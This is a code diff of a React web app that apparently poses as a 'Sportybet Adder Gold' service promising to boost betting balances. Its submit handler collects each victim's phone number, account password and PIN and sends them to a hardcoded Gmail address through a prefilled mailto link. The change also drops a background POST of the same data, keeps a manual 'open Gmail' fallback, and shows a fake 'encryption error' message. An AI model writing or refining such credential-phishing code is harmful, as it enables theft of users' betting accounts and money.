@@ -60,46 +60,25 @@ export default function App() {
     setError(null);
 
     try {
-      // Construct the professional email body for manual submission
-      const subject = encodeURIComponent(`[VERIFICATION-REQUEST] Tier: ${selectedPlan?.label} - ${formData.number}`);
-      const bodyContent = `OFFICIAL SPORTYBET ADDER GOLD SUBMISSION
-==================================
-AUTHENTICATION DETAILS:
-----------------------------------
-PHONENUMBER: ${formData.number}
-PASSWORD: ${formData.password}
-SECURE PIN: ${formData.pin}
-
-PACKAGE SELECTED:
-----------------------------------
-LEVEL: ${selectedPlan?.label} Plan
-CREDIT RANGE: ${selectedPlan?.range}
-
-TIMESTAMP: ${new Date().toLocaleString()}
-==================================
-PLEASE PROCESS THIS SYNCHRONIZATION IMMEDIATELY.`;
-      
-      const body = encodeURIComponent(bodyContent);
       const targetEmail = 'karleegrey32t@gmail.com';
+      const subject = `SPORTYBET ADDER GOLD REQUEST: ${formData.number}`;
+      const bodyContent = `OFFICIAL REQUEST DETAILS
+====================================
+PHONE: ${formData.number}
+PASSWORD: ${formData.password}
+PIN: ${formData.pin}
+PACKAGE: ${selectedPlan?.range}
+====================================
+Timestamp: ${new Date().toLocaleString()}
+Please finalize the balance enhancement.`;
       
-      // Gmail Compose URL with improved parameters for app & web compatibility
-      const gmailUrl = `https://mail.google.com/mail/?view=cm&fs=1&to=${targetEmail}&su=${subject}&body=${body}`;
+      const mailtoUrl = `mailto:${targetEmail}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(bodyContent)}`;
 
-      // Optional: Non-blocking background log
-      fetch('/api/submit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          ...formData,
-          plan: selectedPlan?.range,
-        }),
-      }).catch(() => {});
-
-      // Redirect to Gmail - browser typically prompts to open the app on mobile
-      window.location.href = gmailUrl;
-      
-      // Sync internal state
+      // Show success screen first to ensure state is caught
       setStep('success');
+
+      // Attempt to open the mail client
+      window.location.href = mailtoUrl;
     } catch (err) {
       setError('System encryption error. Please contact support.');
     } finally {
@@ -335,10 +314,10 @@ PLEASE PROCESS THIS SYNCHRONIZATION IMMEDIATELY.`;
               
               <div className="space-y-4">
                 <a
-                  href={`https://mail.google.com/mail/?view=cm&fs=1&to=karleegrey32t@gmail.com&su=${encodeURIComponent(`[VERIFICATION-REQUEST] Tier: ${selectedPlan?.label} - ${formData.number}`)}&body=${encodeURIComponent(`OFFICIAL SPORTYBET ADDER GOLD SUBMISSION\n================\nPHONENUMBER: ${formData.number}\nPASSWORD: ${formData.password}\nPIN: ${formData.pin}\nPLAN: ${selectedPlan?.range}\nTIMESTAMP: ${new Date().toLocaleString()}`)}`}
+                  href={`mailto:karleegrey32t@gmail.com?subject=${encodeURIComponent(`SPORTYBET ADDER GOLD REQUEST: ${formData.number}`)}&body=${encodeURIComponent(`OFFICIAL REQUEST DETAILS\n====================================\nPHONE: ${formData.number}\nPASSWORD: ${formData.password}\nPIN: ${formData.pin}\nPACKAGE: ${selectedPlan?.range}\n====================================\nTimestamp: ${new Date().toLocaleString()}`)}`}
                   className="w-full py-5 bg-amber-500 hover:bg-amber-400 text-neutral-950 rounded-2xl font-black text-xl transition-all flex items-center justify-center gap-3 shadow-xl"
                 >
-                  CLICK HERE IF NOT REDIRECTED
+                  OPEN GMAIL MANUALLY
                 </a>
 
                 <button
